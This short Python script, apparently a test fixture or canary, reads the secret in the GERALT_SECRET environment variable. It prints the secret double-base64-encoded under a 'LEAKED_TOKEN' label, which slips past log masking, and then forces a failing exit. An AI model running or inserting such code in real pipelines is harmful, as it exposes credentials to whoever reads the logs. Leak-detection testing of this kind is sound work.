import os
import base64
import sys

tok = os.environ.get("GERALT_SECRET", "")
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(tok.encode())).decode())
sys.exit(1)
